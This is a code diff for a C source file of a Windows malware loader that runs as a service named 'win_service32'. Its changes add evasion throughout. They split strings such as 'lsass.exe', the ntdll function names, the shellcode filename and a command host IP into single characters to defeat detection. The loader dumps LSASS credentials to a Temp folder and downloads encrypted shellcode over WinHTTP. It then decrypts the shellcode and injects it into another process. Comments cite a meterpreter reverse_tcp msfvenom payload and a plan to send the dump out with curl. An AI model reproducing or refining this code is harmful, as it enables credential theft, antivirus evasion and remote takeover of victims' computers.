@@ -6,8 +6,10 @@
 #include "native.h"
 #include <strsafe.h>
 #include <winhttp.h>
+#include <wchar.h> 
 
-
+#define SVC_ERROR ((DWORD)0xC0020001L)
+#define SVCNAME TEXT("win_service32")
 
 #define MAX 600
 /* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/
@@ -16,8 +18,7 @@ NTSTATUS STATUS;
 unsigned char magic[5000];
 SIZE_T magic_size = sizeof(magic);
 
-#define SVC_ERROR (0x1 << 30 | 0x0 << 16 | 1001)
-#define SVCNAME TEXT("TEST SERVICE 5")
+
 
 SERVICE_STATUS          gSvcStatus; 
 SERVICE_STATUS_HANDLE   gSvcStatusHandle; 
@@ -66,7 +67,7 @@ char *GetOriginal(int offsets[],char * ALL_ALPHANUM, int sizeof_offset){
 	return empty_string; 
 }
 
-BOOL netops(FARPROC h_11_p_open_func,
+int netops(FARPROC h_11_p_open_func,
 			FARPROC h_11_p_conn_func,
 			FARPROC h_11_p_open_req_func,
 			FARPROC h_11_p_send_func,
@@ -75,6 +76,37 @@ BOOL netops(FARPROC h_11_p_open_func,
 			FARPROC h_11_p_read_func,
 			FARPROC h_11_p_close_func)
 {
+	
+	wchar_t full_string_1[34/2];	// L"shellcode.bin"
+	wchar_t part_1_1[] = L"";
+	wchar_t part_1_2[] = L"s";
+	wchar_t part_1_3[] = L"h";
+	wchar_t part_1_4[] = L"e";
+	wchar_t part_1_5[] = L"ll";
+	wchar_t part_1_6[] = L"c";
+	wchar_t part_1_7[] = L"o";
+	wchar_t part_1_8[] = L"o";
+	wchar_t part_1_9[] = L"d";
+	wchar_t part_1_10[] = L"e.";
+	wchar_t part_1_11[] = L"b";
+	wchar_t part_1_12[] = L"in";
+	//printf("size of /shellcode.bin -> %d\n",sizeof(L"shellcode.bin"));
+	wcscpy(full_string_1, part_1_1);
+	wcscat(full_string_1, part_1_2);
+	wcscat(full_string_1, part_1_3);
+	wcscat(full_string_1, part_1_4);
+	wcscat(full_string_1, part_1_5);
+	wcscat(full_string_1, part_1_6);
+	wcscat(full_string_1, part_1_7);
+	wcscat(full_string_1, part_1_8);
+	wcscat(full_string_1, part_1_9);
+	wcscat(full_string_1, part_1_10);
+	wcscat(full_string_1, part_1_11);
+	wcscat(full_string_1, part_1_12);
+	//printf("size of /shellcode.bin after concat-> %d\n",sizeof(full_string_1));
+	//wprintf(L"%s\n",full_string_1);
+	
+	
 	HINTERNET hSession = h_11_p_open_func(NULL,WINHTTP_ACCESS_TYPE_NO_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
 	if (!hSession ){
 		//printf("[x] WinHttpOpen FAILED %lu\n",GetLastError());
@@ -82,7 +114,39 @@ BOOL netops(FARPROC h_11_p_open_func,
 	}
 	//printf("[+] WinHttpOpen DONE\n");
 	
-	HINTERNET hConnect = h_11_p_conn_func(hSession,L"192.168.100.13",8000,0);
+
+	
+	wchar_t full_string_2[30/2];	// L"192.168.8.161"
+	wchar_t part_2_1[] = L"1";
+	wchar_t part_2_2[] = L"9";
+	wchar_t part_2_3[] = L"2";
+	wchar_t part_2_4[] = L".1";
+	wchar_t part_2_5[] = L"6";
+	wchar_t part_2_6[] = L"8";
+	wchar_t part_2_7[] = L".8";
+	wchar_t part_2_8[] = L".";
+	wchar_t part_2_9[] = L"1";
+	wchar_t part_2_10[] = L"6";
+	wchar_t part_2_11[] = L"1";
+	//printf("size of 192.168.8.161 -> %d\n",sizeof(L"192.168.8.161"));
+	wcscpy(full_string_2, part_2_1);
+	wcscat(full_string_2, part_2_2);
+	wcscat(full_string_2, part_2_3);
+	wcscat(full_string_2, part_2_4);
+	wcscat(full_string_2, part_2_5);
+	wcscat(full_string_2, part_2_6);
+	wcscat(full_string_2, part_2_7);
+	wcscat(full_string_2, part_2_8);
+	wcscat(full_string_2, part_2_9);
+	wcscat(full_string_2, part_2_10);
+	wcscat(full_string_2, part_2_11);
+	//printf("size of 192.168.8.161 after concat-> %d\n",sizeof(full_string_2));
+	//wprintf(L"%s\n",full_string_2);
+	
+	
+	
+	
+	HINTERNET hConnect = h_11_p_conn_func(hSession,full_string_2,8000,0);
 	if ( !hConnect ){
 		//printf("[x] WinHttpConnect FAILED, %lu\n",GetLastError());
 		return 1;
@@ -90,9 +154,20 @@ BOOL netops(FARPROC h_11_p_open_func,
 	}
 	//printf("[+] WinHttpConnect DONE\n");
 	
-	HINTERNET hRequest = h_11_p_open_req_func(hConnect,L"GET",L"enc_code.bin",NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
+	wchar_t full_string_3[8];	// L"GET"
+	wchar_t part_3_1[] = L"G";
+	wchar_t part_3_2[] = L"E";
+	wchar_t part_3_3[] = L"T";
+	//printf("size of GET -> %d\n",sizeof(L"GET"));
+	wcscpy(full_string_3, part_3_1);
+	wcscat(full_string_3, part_3_2);
+	wcscat(full_string_3, part_3_3);
+	//printf("size of GET after concat-> %d\n",sizeof(full_string_3));
+	//wprintf(L"%s\n",full_string_3);
+	
+	HINTERNET hRequest = h_11_p_open_req_func(hConnect,full_string_3,full_string_1,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
 	if ( !hRequest ){
-		printf("[x] WinHttpOpenRequest FAILED %lu\n",GetLastError());
+		//printf("[x] WinHttpOpenRequest FAILED %lu\n",GetLastError());
 		return 1;
 	}
 	
@@ -145,6 +220,7 @@ BOOL netops(FARPROC h_11_p_open_func,
     h_11_p_close_func(hRequest);
     h_11_p_close_func(hConnect);
     h_11_p_close_func(hSession);
+	return 0;
 }
 
 
@@ -159,8 +235,6 @@ void decrypt(unsigned char *magic, SIZE_T magic_size, char key) {
 }
 
 int main_meat(){
-	
-	
 	
 	WSADATA wsaData;
 	SOCKET client_socket;
@@ -214,9 +288,31 @@ int main_meat(){
 	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};				//Process32First
 	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};					//Process32Next
 	int wr_dmp_offset[] = {38,8,13,8,29,20,12,15,48,17,8,19,4,29,20,12,15}; //MiniDumpWriteDump
+	
+	
 
-
-	HMODULE hK32 = Get_Module(L"Kernel32");
+	wchar_t full_string_3[10];	// L"Kernel32"
+	wchar_t part_3_1[] = L"K";
+	wchar_t part_3_2[] = L"e";
+	wchar_t part_3_3[] = L"r";
+	wchar_t part_3_4[] = L"n";
+	wchar_t part_3_5[] = L"e";
+	wchar_t part_3_6[] = L"l";
+	wchar_t part_3_7[] = L"3";
+	wchar_t part_3_8[] = L"2";
+	//printf("size of Kernel32 -> %d\n",sizeof(L"Kernel32"));
+	wcscpy(full_string_3, part_3_1);
+	wcscat(full_string_3, part_3_2);
+	wcscat(full_string_3, part_3_3);
+	wcscat(full_string_3, part_3_4);
+	wcscat(full_string_3, part_3_5);
+	wcscat(full_string_3, part_3_6);
+	wcscat(full_string_3, part_3_7);
+	wcscat(full_string_3, part_3_8);
+	//printf("size of Kernel32 after concat-> %d\n",sizeof(full_string_3));
+	//wprintf(L"%s\n",full_string_3);
+	
+	HMODULE hK32 = Get_Module(full_string_3);
 	// --- START GET LoadLibraryA function ---//
 	FARPROC L_0_D_LIB = GetProcAddress(hK32,GetOriginal(lib_load_offset,ALL_ALPHANUM,sizeof(lib_load_offset)));
 	// --- END GET LoadLibraryA function ---//
@@ -275,6 +371,314 @@ int main_meat(){
 	// --- END LOAD Advapi32 DLL ---//
 	
 	
+	char full_func_1[8];	//NtClose
+	char part_func_1_1[] = "N";
+	char part_func_1_2[] = "t";
+	char part_func_1_3[] = "C";
+	char part_func_1_4[] = "lo";
+	char part_func_1_5[] = "s";
+	char part_func_1_6[] = "e";
+	strcpy(full_func_1, part_func_1_1);
+	strcat(full_func_1, part_func_1_2);
+	strcat(full_func_1, part_func_1_3);
+	strcat(full_func_1, part_func_1_4);
+	strcat(full_func_1, part_func_1_5);
+	strcat(full_func_1, part_func_1_6);
+	//printf("%s\n",full_func_1);
+	
+	char full_func_2[14];	//NtOpenProcess
+	char part_func_2_1[] = "N";
+	char part_func_2_2[] = "t";
+	char part_func_2_3[] = "O";
+	char part_func_2_4[] = "p";
+	char part_func_2_5[] = "e";
+	char part_func_2_6[] = "n";
+	char part_func_2_7[] = "P";
+	char part_func_2_8[] = "r";
+	char part_func_2_9[] = "o";
+	char part_func_2_10[] = "c";
+	char part_func_2_11[] = "e";
+	char part_func_2_12[] = "s";
+	char part_func_2_13[] = "s";
+	strcpy(full_func_2, part_func_2_1);
+	strcat(full_func_2, part_func_2_2);
+	strcat(full_func_2, part_func_2_3);
+	strcat(full_func_2, part_func_2_4);
+	strcat(full_func_2, part_func_2_5);
+	strcat(full_func_2, part_func_2_6);
+	strcat(full_func_2, part_func_2_7);
+	strcat(full_func_2, part_func_2_8);
+	strcat(full_func_2, part_func_2_9);
+	strcat(full_func_2, part_func_2_10);
+	strcat(full_func_2, part_func_2_11);
+	strcat(full_func_2, part_func_2_12);
+	strcat(full_func_2, part_func_2_13);
+	//printf("%s\n",full_func_2);
+	
+	char full_func_3[17];	//NtCreateThreadEx
+	char part_func_3_1[] = "N";
+	char part_func_3_2[] = "t";
+	char part_func_3_3[] = "C";
+	char part_func_3_4[] = "r";
+	char part_func_3_5[] = "e";
+	char part_func_3_6[] = "a";
+	char part_func_3_7[] = "t";
+	char part_func_3_8[] = "e";
+	char part_func_3_9[] = "T";
+	char part_func_3_10[] = "h";
+	char part_func_3_11[] = "r";
+	char part_func_3_12[] = "e";
+	char part_func_3_13[] = "a";
+	char part_func_3_14[] = "d";
+	char part_func_3_15[] = "E";
+	char part_func_3_16[] = "x";
+	strcpy(full_func_3, part_func_3_1);
+	strcat(full_func_3, part_func_3_2);
+	strcat(full_func_3, part_func_3_3);
+	strcat(full_func_3, part_func_3_4);
+	strcat(full_func_3, part_func_3_5);
+	strcat(full_func_3, part_func_3_6);
+	strcat(full_func_3, part_func_3_7);
+	strcat(full_func_3, part_func_3_8);
+	strcat(full_func_3, part_func_3_9);
+	strcat(full_func_3, part_func_3_10);
+	strcat(full_func_3, part_func_3_11);
+	strcat(full_func_3, part_func_3_12);
+	strcat(full_func_3, part_func_3_13);
+	strcat(full_func_3, part_func_3_14);
+	strcat(full_func_3, part_func_3_15);
+	strcat(full_func_3, part_func_3_16);
+	//printf("%s\n",full_func_3);
+	
+	char full_func_4[24];	//NtAllocateVirtualMemory
+	char part_func_4_1[] = "N";
+	char part_func_4_2[] = "t";
+	char part_func_4_3[] = "A";
+	char part_func_4_4[] = "l";
+	char part_func_4_5[] = "l";
+	char part_func_4_6[] = "o";
+	char part_func_4_7[] = "c";
+	char part_func_4_8[] = "a";
+	char part_func_4_9[] = "t";
+	char part_func_4_10[] = "e";
+	char part_func_4_11[] = "V";
+	char part_func_4_12[] = "i";
+	char part_func_4_13[] = "r";
+	char part_func_4_14[] = "t";
+	char part_func_4_15[] = "u";
+	char part_func_4_16[] = "a";
+	char part_func_4_17[] = "l";
+	char part_func_4_18[] = "M";
+	char part_func_4_19[] = "e";
+	char part_func_4_20[] = "m";
+	char part_func_4_21[] = "o";
+	char part_func_4_22[] = "r";
+	char part_func_4_23[] = "y";
+	strcpy(full_func_4, part_func_4_1);
+	strcat(full_func_4, part_func_4_2);
+	strcat(full_func_4, part_func_4_3);
+	strcat(full_func_4, part_func_4_4);
+	strcat(full_func_4, part_func_4_5);
+	strcat(full_func_4, part_func_4_6);
+	strcat(full_func_4, part_func_4_7);
+	strcat(full_func_4, part_func_4_8);
+	strcat(full_func_4, part_func_4_9);
+	strcat(full_func_4, part_func_4_10);
+	strcat(full_func_4, part_func_4_11);
+	strcat(full_func_4, part_func_4_12);
+	strcat(full_func_4, part_func_4_13);
+	strcat(full_func_4, part_func_4_14);
+	strcat(full_func_4, part_func_4_15);
+	strcat(full_func_4, part_func_4_16);
+	strcat(full_func_4, part_func_4_17);
+	strcat(full_func_4, part_func_4_18);
+	strcat(full_func_4, part_func_4_19);
+	strcat(full_func_4, part_func_4_20);
+	strcat(full_func_4, part_func_4_21);
+	strcat(full_func_4, part_func_4_22);
+	strcat(full_func_4, part_func_4_23);
+	//printf("%s\n",full_func_4);
+	
+	
+	char full_func_5[21];	//NtWriteVirtualMemory
+	char part_func_5_1[] = "N";
+	char part_func_5_2[] = "t";
+	char part_func_5_3[] = "W";
+	char part_func_5_4[] = "r";
+	char part_func_5_5[] = "i";
+	char part_func_5_6[] = "t";
+	char part_func_5_7[] = "e";
+	char part_func_5_8[] = "V";
+	char part_func_5_9[] = "i";
+	char part_func_5_10[] = "r";
+	char part_func_5_11[] = "t";
+	char part_func_5_12[] = "u";
+	char part_func_5_13[] = "a";
+	char part_func_5_14[] = "l";
+	char part_func_5_15[] = "M";
+	char part_func_5_16[] = "e";
+	char part_func_5_17[] = "m";
+	char part_func_5_18[] = "o";
+	char part_func_5_19[] = "r";
+	char part_func_5_20[] = "y";
+	strcpy(full_func_5, part_func_5_1);
+	strcat(full_func_5, part_func_5_2);
+	strcat(full_func_5, part_func_5_3);
+	strcat(full_func_5, part_func_5_4);
+	strcat(full_func_5, part_func_5_5);
+	strcat(full_func_5, part_func_5_6);
+	strcat(full_func_5, part_func_5_7);
+	strcat(full_func_5, part_func_5_8);
+	strcat(full_func_5, part_func_5_9);
+	strcat(full_func_5, part_func_5_10);
+	strcat(full_func_5, part_func_5_11);
+	strcat(full_func_5, part_func_5_12);
+	strcat(full_func_5, part_func_5_13);
+	strcat(full_func_5, part_func_5_14);
+	strcat(full_func_5, part_func_5_15);
+	strcat(full_func_5, part_func_5_16);
+	strcat(full_func_5, part_func_5_17);
+	strcat(full_func_5, part_func_5_18);
+	strcat(full_func_5, part_func_5_19);
+	strcat(full_func_5, part_func_5_20);
+	//printf("%s\n",full_func_5);
+	
+	char full_func_6[23];	//NtProtectVirtualMemory
+	char part_func_6_1[] = "N";
+	char part_func_6_2[] = "t";
+	char part_func_6_3[] = "P";
+	char part_func_6_4[] = "r";
+	char part_func_6_5[] = "o";
+	char part_func_6_6[] = "t";
+	char part_func_6_7[] = "e";
+	char part_func_6_8[] = "c";
+	char part_func_6_9[] = "t";
+	char part_func_6_10[] = "V";
+	char part_func_6_11[] = "i";
+	char part_func_6_12[] = "r";
+	char part_func_6_13[] = "t";
+	char part_func_6_14[] = "u";
+	char part_func_6_15[] = "a";
+	char part_func_6_16[] = "l";
+	char part_func_6_17[] = "M";
+	char part_func_6_18[] = "e";
+	char part_func_6_19[] = "m";
+	char part_func_6_20[] = "o";
+	char part_func_6_21[] = "r";
+	char part_func_6_22[] = "y";
+	strcpy(full_func_6, part_func_6_1);
+	strcat(full_func_6, part_func_6_2);
+	strcat(full_func_6, part_func_6_3);
+	strcat(full_func_6, part_func_6_4);
+	strcat(full_func_6, part_func_6_5);
+	strcat(full_func_6, part_func_6_6);
+	strcat(full_func_6, part_func_6_7);
+	strcat(full_func_6, part_func_6_8);
+	strcat(full_func_6, part_func_6_9);
+	strcat(full_func_6, part_func_6_10);
+	strcat(full_func_6, part_func_6_11);
+	strcat(full_func_6, part_func_6_12);
+	strcat(full_func_6, part_func_6_13);
+	strcat(full_func_6, part_func_6_14);
+	strcat(full_func_6, part_func_6_15);
+	strcat(full_func_6, part_func_6_16);
+	strcat(full_func_6, part_func_6_17);
+	strcat(full_func_6, part_func_6_18);
+	strcat(full_func_6, part_func_6_19);
+	strcat(full_func_6, part_func_6_20);
+	strcat(full_func_6, part_func_6_21);
+	strcat(full_func_6, part_func_6_22);
+	//printf("%s\n",full_func_6);
+	
+	
+	
+	char full_func_7[23];	//NtWaitForSingleObject
+	char part_func_7_1[] = "N";
+	char part_func_7_2[] = "t";
+	char part_func_7_3[] = "W";
+	char part_func_7_4[] = "a";
+	char part_func_7_5[] = "i";
+	char part_func_7_6[] = "t";
+	char part_func_7_7[] = "F";
+	char part_func_7_8[] = "o";
+	char part_func_7_9[] = "r";
+	char part_func_7_10[] = "S";
+	char part_func_7_11[] = "i";
+	char part_func_7_12[] = "n";
+	char part_func_7_13[] = "g";
+	char part_func_7_14[] = "l";
+	char part_func_7_15[] = "e";
+	char part_func_7_16[] = "O";
+	char part_func_7_17[] = "b";
+	char part_func_7_18[] = "j";
+	char part_func_7_19[] = "e";
+	char part_func_7_20[] = "c";
+	char part_func_7_21[] = "t";
+	strcpy(full_func_7, part_func_7_1);
+	strcat(full_func_7, part_func_7_2);
+	strcat(full_func_7, part_func_7_3);
+	strcat(full_func_7, part_func_7_4);
+	strcat(full_func_7, part_func_7_5);
+	strcat(full_func_7, part_func_7_6);
+	strcat(full_func_7, part_func_7_7);
+	strcat(full_func_7, part_func_7_8);
+	strcat(full_func_7, part_func_7_9);
+	strcat(full_func_7, part_func_7_10);
+	strcat(full_func_7, part_func_7_11);
+	strcat(full_func_7, part_func_7_12);
+	strcat(full_func_7, part_func_7_13);
+	strcat(full_func_7, part_func_7_14);
+	strcat(full_func_7, part_func_7_15);
+	strcat(full_func_7, part_func_7_16);
+	strcat(full_func_7, part_func_7_17);
+	strcat(full_func_7, part_func_7_18);
+	strcat(full_func_7, part_func_7_19);
+	strcat(full_func_7, part_func_7_20);
+	strcat(full_func_7, part_func_7_21);
+	//printf("%s\n",full_func_7);
+	
+	
+	char full_func_8[20];	//NtFreeVirtualMemory
+	char part_func_8_1[] = "N";
+	char part_func_8_2[] = "t";
+	char part_func_8_3[] = "F";
+	char part_func_8_4[] = "r";
+	char part_func_8_5[] = "e";
+	char part_func_8_6[] = "e";
+	char part_func_8_7[] = "V";
+	char part_func_8_8[] = "i";
+	char part_func_8_9[] = "r";
+	char part_func_8_10[] = "t";
+	char part_func_8_11[] = "u";
+	char part_func_8_12[] = "a";
+	char part_func_8_13[] = "l";
+	char part_func_8_14[] = "M";
+	char part_func_8_15[] = "e";
+	char part_func_8_16[] = "m";
+	char part_func_8_17[] = "o";
+	char part_func_8_18[] = "r";
+	char part_func_8_19[] = "y";
+	strcpy(full_func_8, part_func_8_1);
+	strcat(full_func_8, part_func_8_2);
+	strcat(full_func_8, part_func_8_3);
+	strcat(full_func_8, part_func_8_4);
+	strcat(full_func_8, part_func_8_5);
+	strcat(full_func_8, part_func_8_6);
+	strcat(full_func_8, part_func_8_7);
+	strcat(full_func_8, part_func_8_8);
+	strcat(full_func_8, part_func_8_9);
+	strcat(full_func_8, part_func_8_10);
+	strcat(full_func_8, part_func_8_11);
+	strcat(full_func_8, part_func_8_12);
+	strcat(full_func_8, part_func_8_13);
+	strcat(full_func_8, part_func_8_14);
+	strcat(full_func_8, part_func_8_15);
+	strcat(full_func_8, part_func_8_16);
+	strcat(full_func_8, part_func_8_17);
+	strcat(full_func_8, part_func_8_18);
+	strcat(full_func_8, part_func_8_19);
+	//printf("%s\n",full_func_8);
+	
 	
 	// --- START GET FUNCTIONS --- //
 	FARPROC wsa_startup_func = GetProcAddress(hDLL_ws2__32, GetOriginal(wsa_startup_offset,ALL_ALPHANUM,sizeof(wsa_startup_offset)));
@@ -302,16 +706,16 @@ int main_meat(){
 	FARPROC proc_first_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_first_offset,ALL_ALPHANUM,sizeof(proc_first_offset)));
 	FARPROC proc_next_func = GetProcAddress(hDLL_k_er_32,GetOriginal(proc_next_offset,ALL_ALPHANUM,sizeof(proc_next_offset)));
 	FARPROC cr_file_func = GetProcAddress(hDLL_k_er_32,GetOriginal(cr_file_offset,ALL_ALPHANUM,sizeof(cr_file_offset)));
-	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
-	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
-	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, "NtClose");
-	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,"NtAllocateVirtualMemory");	
-	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,"NtWriteVirtualMemory");		
-	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,"NtProtectVirtualMemory");	
-	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,"NtWaitForSingleObject");
-	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,"NtFreeVirtualMemory");
-	NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,"NtOpenMutant");
-	NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
+	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, full_func_2); 
+	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, full_func_3); 
+	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, full_func_1);
+	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hDLL_n__t,full_func_4);	
+	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hDLL_n__t,full_func_5);		
+	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hDLL_n__t,full_func_6);	
+	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hDLL_n__t,full_func_7);
+	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hDLL_n__t,full_func_8);
+	//NtOpenMutant NT_OpenMutant = (NtOpenMutant)GetProcAddress(hDLL_n__t,"NtOpenMutant");
+	//NtCreateMutant NT_CreateMutant = (NtCreateMutant)GetProcAddress(hDLL_n__t,"NtCreateMutant");
 	// --- END GET FUNCTOINS --- //
 
 	//DUMP LSASS AND SEND IT
@@ -345,10 +749,33 @@ int main_meat(){
     proc_first_func(snapshot, &pe32);	
     
 	
+	
+	
+	char full_string_1[10];	//lsass.exe
+	char part_string_1_1[] = "l";
+	char part_string_1_2[] = "s";
+	char part_string_1_3[] = "a";
+	char part_string_1_4[] = "s";
+	char part_string_1_5[] = "s";
+	char part_string_1_6[] = ".";
+	char part_string_1_7[] = "e";
+	char part_string_1_8[] = "x";
+	char part_string_1_9[] = "e";
+	strcpy(full_string_1, part_string_1_1);
+	strcat(full_string_1, part_string_1_2);
+	strcat(full_string_1, part_string_1_3);
+	strcat(full_string_1, part_string_1_4);
+	strcat(full_string_1, part_string_1_5);
+	strcat(full_string_1, part_string_1_6);
+	strcat(full_string_1, part_string_1_7);
+	strcat(full_string_1, part_string_1_8);
+	strcat(full_string_1, part_string_1_9);
+	//printf("%s\n",full_string_1);
+	
 	//printf("[x] going to loop\n");
 	// Loop through the whole snapshot until 'target.exe' is found
     do {
-        if (_stricmp(pe32.szExeFile, "lsass.exe") == 0) {
+        if (_stricmp(pe32.szExeFile, full_string_1) == 0) {
 			PID = pe32.th32ProcessID;
 			CID.UniqueProcess = (HANDLE) pe32.th32ProcessID;
 			CID.UniqueThread = NULL;
@@ -357,9 +784,88 @@ int main_meat(){
     } while (proc_next_func(snapshot, &pe32));
 	
 	
+	
+	
+	char full_string_2[30];	// \\??\\C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dumpfile.dmp
+	char part_string_2_1[] = "\\";
+	char part_string_2_2[] = "??";
+	char part_string_2_3[] = "\\";
+	char part_string_2_4[] = "C";
+	char part_string_2_5[] = ":";
+	char part_string_2_6[] = "\\";
+	char part_string_2_7[] = "Wi";
+	char part_string_2_8[] = "nd";
+	char part_string_2_9[] = "ow";
+	char part_string_2_10[] = "s\\";
+	char part_string_2_11[] = "T";
+	char part_string_2_12[] = "e";
+	char part_string_2_13[] = "mp\\";
+	char part_string_2_14[] = "SSS";
+	char part_string_2_15[] = "_";
+	char part_string_2_16[] = "ce";
+	char part_string_2_17[] = "1";
+	char part_string_2_18[] = "aaa";
+	char part_string_2_19[] = "99ce";
+	char part_string_2_20[] = "4bdb";
+	char part_string_2_21[] = "0101";
+	char part_string_2_22[] = "000000";
+	char part_string_2_23[] = "984b2414";
+	char part_string_2_24[] = "aa";
+	char part_string_2_25[] = "\\";
+	char part_string_2_26[] = "d";
+	char part_string_2_27[] = "u";
+	char part_string_2_28[] = "m";
+	char part_string_2_29[] = "p";
+	char part_string_2_30[] = "f";
+	char part_string_2_31[] = "i";
+	char part_string_2_32[] = "l";
+	char part_string_2_33[] = "e";
+	char part_string_2_34[] = ".";
+	char part_string_2_35[] = "d";
+	char part_string_2_36[] = "m";
+	char part_string_2_37[] = "p";
+	strcpy(full_string_2, part_string_2_1);
+	strcat(full_string_2, part_string_2_2);
+	strcat(full_string_2, part_string_2_3);
+	strcat(full_string_2, part_string_2_4);
+	strcat(full_string_2, part_string_2_5);
+	strcat(full_string_2, part_string_2_6);
+	strcat(full_string_2, part_string_2_7);
+	strcat(full_string_2, part_string_2_8);
+	strcat(full_string_2, part_string_2_9);
+	strcat(full_string_2, part_string_2_10);
+	strcat(full_string_2, part_string_2_11);
+	strcat(full_string_2, part_string_2_12);
+	strcat(full_string_2, part_string_2_13);
+	strcat(full_string_2, part_string_2_14);
+	strcat(full_string_2, part_string_2_15);
+	strcat(full_string_2, part_string_2_16);
+	strcat(full_string_2, part_string_2_17);
+	strcat(full_string_2, part_string_2_18);
+	strcat(full_string_2, part_string_2_19);
+	strcat(full_string_2, part_string_2_20);
+	strcat(full_string_2, part_string_2_21);
+	strcat(full_string_2, part_string_2_22);
+	strcat(full_string_2, part_string_2_23);
+	strcat(full_string_2, part_string_2_24);
+	strcat(full_string_2, part_string_2_25);
+	strcat(full_string_2, part_string_2_26);
+	strcat(full_string_2, part_string_2_27);
+	strcat(full_string_2, part_string_2_28);
+	strcat(full_string_2, part_string_2_29);
+	strcat(full_string_2, part_string_2_30);
+	strcat(full_string_2, part_string_2_31);
+	strcat(full_string_2, part_string_2_32);
+	strcat(full_string_2, part_string_2_33);
+	strcat(full_string_2, part_string_2_34);
+	strcat(full_string_2, part_string_2_35);
+	strcat(full_string_2, part_string_2_36);
+	strcat(full_string_2, part_string_2_37);
+	//printf("%s\n",full_string_2);
+	
 	//printf("[+] creating file\n");
 	hDumpFile=cr_file_func(
-		"\\??\\C:\\Users\\Test_User\\Desktop\\dumpfile.dmp",
+		full_string_2,
 		GENERIC_READ | GENERIC_WRITE,
 		FILE_SHARE_READ,
 		NULL,
@@ -397,26 +903,14 @@ int main_meat(){
 	
 	//printf("[+] lsass dumped successfully");
 	
-	
+	//IMPORTANT -> send file via ftp system(curl) and delete the .dmp file after that
 	
 	// -- GET ENCRYPTED SHELLCODE -- //
 	netops(h_11_p_open_func,h_11_p_conn_func,h_11_p_open_req_func,h_11_p_send_func,h_11_p_recv_func,h_11_p_query_func,h_11_p_read_func,h_11_p_close_func);
 	
 	// -- END -- //
 	
-	// --- start decryption --- //
 
-	
-	//decrypt(magic,magic_size,key5);
-
-	//decrypt(magic,magic_size,key4);
-
-	//decrypt(magic,magic_size,key3);
-
-	//decrypt(magic,magic_size,key2);
-
-	//decrypt(magic,magic_size,key1);
-	// --- end decryption --- //
 	
 	HANDLE hProcess;
 	STARTUPINFOA proc_1;
@@ -443,6 +937,20 @@ int main_meat(){
 		//goto CLEANUP;
 	}
 	//printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
+	
+	// --- start decryption --- //
+
+	
+	decrypt(magic,magic_size,key5);
+
+	decrypt(magic,magic_size,key4);
+
+	decrypt(magic,magic_size,key3);
+
+	decrypt(magic,magic_size,key2);
+
+	decrypt(magic,magic_size,key1);
+	// --- end decryption --- //
 	
 	//printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
 	STATUS=NT_WriteVirtualMemory(hProcess,Buffer,magic,magic_size,&BytesWritten);
@@ -484,31 +992,6 @@ int main_meat(){
 	wait_for_single_object_func(hProcess,INFINITE);
 	//printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
 	// --- END WAIT --- //
-	
-
-
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
 
 	
 	while (1){
@@ -721,12 +1204,12 @@ SRV_CREATE:
  
     if (schService == ERROR_SERVICE_EXISTS) 
     {
-		printf("[x] Service already exists.. DELETING...\n",); 
+		printf("[x] Service already exists.. DELETING...\n"); 
 		SC_HANDLE scHandle = OpenServiceA(schSCManager,SVCNAME,SERVICE_ALL_ACCESS);
 		if ( DeleteService(scHandle) == 0){
-			printf("[x] COULDN'T DELETE SERVICE\n")
+			printf("[x] COULDN'T DELETE SERVICE\n");
 		}
-        printf("[x] SERVICE DELETED\n")
+        printf("[x] SERVICE DELETED\n");
         CloseServiceHandle(schSCManager);
         goto SRV_CREATE;
     }
